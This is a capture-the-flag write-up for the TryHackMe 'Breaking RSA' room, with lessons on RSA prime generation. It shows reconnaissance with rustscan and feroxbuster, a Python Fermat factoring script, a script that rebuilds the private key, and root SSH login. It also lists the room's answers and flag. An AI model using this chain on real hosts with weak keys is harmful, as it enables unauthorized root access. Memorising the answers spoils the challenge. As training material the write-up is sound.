# TryHackMe — Breaking RSA

> **Room:** Breaking RSA  
> **Difficulty:** Medium  
> **Category:** Cryptography / Exploitation  
> **Objective:** Exploit a weak RSA implementation (p and q too close together) to reconstruct the private key and retrieve the flag.

---

## Table of Contents

1. [Overview](#overview)
2. [Reconnaissance](#reconnaissance)
   - [Port Scanning](#port-scanning)
   - [Web Enumeration](#web-enumeration)
   - [File Recovery](#file-recovery)
3. [Public Key Analysis](#public-key-analysis)
   - [Key Length](#key-length)
   - [Extracting the Modulus n](#extracting-the-modulus-n)
4. [Factoring n with Fermat's Algorithm](#factoring-n-with-fermats-algorithm)
   - [Why Fermat Works Here](#why-fermat-works-here)
   - [Python Script](#python-script)
   - [Results](#results)
5. [Private Key Reconstruction](#private-key-reconstruction)
   - [Computing d](#computing-d)
   - [Generating the PEM File](#generating-the-pem-file)
6. [SSH Access & Flag Retrieval](#ssh-access--flag-retrieval)
7. [Answers Summary](#answers-summary)


---

## Overview

RSA security relies on the computational hardness of factoring a large semiprime `n = p × q`. When `p` and `q` are randomly and independently chosen, factoring `n` is infeasible even with thousands of bits. However, if a buggy or deprecated cryptographic library generates primes that are **too close to each other**, Fermat's factorization algorithm can crack the key in milliseconds — regardless of the key's bit length.

In this room, the fictional organization **JackFruit** uses such a library to generate a 4096-bit RSA key pair and exposes the public key on a web server. Our goal is to:

1. Discover the exposed public key.
2. Extract the modulus `n`.
3. Factor `n` using Fermat's method.
4. Reconstruct the private key.
5. Authenticate over SSH and read the flag.

---

## Reconnaissance

### Port Scanning

```bash
rustscan -a [IP] -- -sC -sV
```

**Results:**

| Port    | Service | Version                       |
|---------|---------|-------------------------------|
| 22/tcp  | SSH     | OpenSSH 8.2p1 (Ubuntu 20.04)  |
| 80/tcp  | HTTP    | nginx 1.18.0 (Ubuntu)          |

> **Q: How many services are running on the box?**  
> **A: 2**

---

### Web Enumeration

With only two ports open, the HTTP service on port 80 is the obvious next target. A directory brute-force reveals a hidden path:

```bash
feroxbuster \
  -u http://[IP] \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,bak \
  -s 200,301,403,401 \
  -t 50
```

**Interesting findings:**

```
200  http://[IP]/development/id_rsa.pub
200  http://[IP]/development/log.txt
```

> **Q: What is the name of the hidden directory (without the '/')?**  
> **A: `development`**

---

### File Recovery

```bash
curl http://[IP]/development/id_rsa.pub -o id_rsa.pub
curl http://[IP]/development/log.txt   -o log.txt
```

Reading `log.txt` confirms the vulnerability: JackFruit's developers are using a **deprecated cryptographic library** that generates RSA primes `p` and `q` that are extremely close in value. This is the root cause that makes Fermat's attack viable.

---

## Public Key Analysis

### Key Length

```bash
ssh-keygen -l -f id_rsa.pub
```

```
4096 SHA256:DIqTDIhboydTh2QU6i58JP+5aDRnLBPT8GwVun1n0Co no comment (RSA)
```

> **Q: What is the RSA key length (in bits)?**  
> **A: 4096**


---

### Extracting the Modulus n

Convert the SSH public key to PKCS#8 PEM format, then read the modulus:

```bash
ssh-keygen -f id_rsa.pub -e -m PKCS8 > pub.pem
openssl rsa -pubin -in pub.pem -noout -modulus
```

This outputs the hex representation of `n`. To get the **last 10 decimal digits**:

```bash
openssl rsa -pubin -in pub.pem -noout -modulus \
  | cut -d= -f2 \
  | python3 -c "print(str(int(input(), 16))[-10:])"
```

```
1225222383
```

> **Q: What are the last 10 digits of n?**  
> **A: `1225222383`**

---

## Factoring n with Fermat's Algorithm

### Why Fermat Works Here

Fermat's factorization exploits the algebraic identity:

```
n = p × q = a² − b²  =  (a + b)(a − b)
```

where:
- `a = (p + q) / 2`
- `b = (p − q) / 2`

The algorithm starts at `a = ⌈√n⌉` and increments `a` until `a² − n` is a perfect square. When `p` and `q` are close, `b` is very small — meaning the algorithm converges in very few iterations.

In this case, `p` and `q` differ by only **1502** — on a 4096-bit number, that is an astronomically small gap, and Fermat solves it almost instantly.

---

### Python Script

```python
#!/usr/bin/env python3

from math import isqrt

def fermat_factor(n):
    """Factor n using Fermat's method. Efficient when |p - q| is small."""
    if n % 2 == 0:
        return (n // 2, 2)

    a = isqrt(n)
    if a * a == n:
        return (a, a)       

    while True:
        a += 1
        b_sq = a * a - n
        b = isqrt(b_sq)
        if b * b == b_sq:
            break          

    return (a + b, a - b)

n = 0xEB661F287BC43C8F*****BB4A4917BCEF

p, q = fermat_factor(n)

print(f"p = {p}")
print(f"q = {q}")
print(f"p × q == n ? {p * q == n}")
print(f"p − q = {p - q}")
print(f"Bits of p: {p.bit_length()}")
print(f"Bits of q: {q.bit_length()}")
```

---

### Results

```
p = 30989413979221186440...84052940617408518123
q = 30989413979221186440...84052940617408516621

p × q == n ? True

p − q  = 1502
Bits of p: 2048
Bits of q: 2048
```

> **Q: What is the numerical difference between p and q?**  
> **A: `1502`**

Both `p` and `q` are 2048-bit primes, so their product `n = p × q` is a 4096-bit number — consistent with the public key size. The tiny difference of 1502 between two ~617-digit prime numbers is what made this attack trivial.

---

## Private Key Reconstruction

### Computing d

In RSA, the private exponent `d` satisfies:

```
d × e ≡ 1  (mod φ(n))
```

where `φ(n) = (p − 1)(q − 1)` is Euler's totient and `e = 65537` is the standard public exponent.

```python
from math import gcd

e = 65537
phi = (p - 1) * (q - 1)

assert gcd(e, phi) == 1, "e and phi must be coprime"

d = pow(e, -1, phi)  
```

---

### Generating the PEM File

Install `pycryptodome` and construct the full RSA key object:

```bash
python3 -m venv venv && source venv/bin/activate
pip install pycryptodome
```

```python
#!/usr/bin/env python3

from Crypto.PublicKey import RSA


n   = p * q
e   = 65537
phi = (p - 1) * (q - 1)
d   = pow(e, -1, phi)

key = RSA.construct((n, e, d, p, q))

with open("id_rsa", "wb") as f:
    f.write(key.export_key(format="PEM"))

print(f"Private key saved — size: {key.size_in_bits()} bits")
```

```
Private key saved — size: 4096 bits
```

Set the correct file permissions (SSH refuses keys that are world-readable):

```bash
chmod 600 id_rsa
```

---

## SSH Access & Flag Retrieval

```bash
ssh -i id_rsa root@[IP]
```

Once connected:

```bash
root@ip-10-128-169-198:~# ls
flag  snap

root@ip-10-128-169-198:~# cat flag
breakingRSAissuperfun20220809134031
```

> **Q: What is the flag?**  
> **A: `breakingRSAissuperfun20220809134031`**

---

## Answers Summary

| Question                                   | Answer                               |
|--------------------------------------------|--------------------------------------|
| Number of running services                 | `2`                                  |
| Hidden directory name                      | `development`                        |
| RSA key length                             | `4096 bits`                          |
| Last 10 digits of n                        | `1225222383`                         |
| Numerical difference between p and q       | `1502`                               |
| Flag                                       | `breakingRSAissuperfun20220809134031`|

---

## Key Takeaways

### 1. Never Generate p and q Close Together
RSA's security depends on the difficulty of factoring `n`. When `|p − q|` is small, Fermat's algorithm reduces the problem to finding a near-square root — computable in milliseconds even on 4096-bit keys.

### 2. Key Length ≠ Security
A 4096-bit key with a flawed prime generator is weaker than a 512-bit key with a proper one. Bit length only matters when the underlying assumptions hold.

### 3. Deprecated Libraries Are Dangerous
The vulnerability here wasn't a coding bug per se — it was trusting a library that silently generated unsafe primes. Always audit your cryptographic dependencies.

### 4. Exposing a Public Key Is Not Always Safe
In standard deployments, a public key can be freely shared. But if the key was generated with a weak algorithm, the public key alone is enough to recover the private key.

*Writeup by SubZer030 — TryHackMe: Breaking RSA*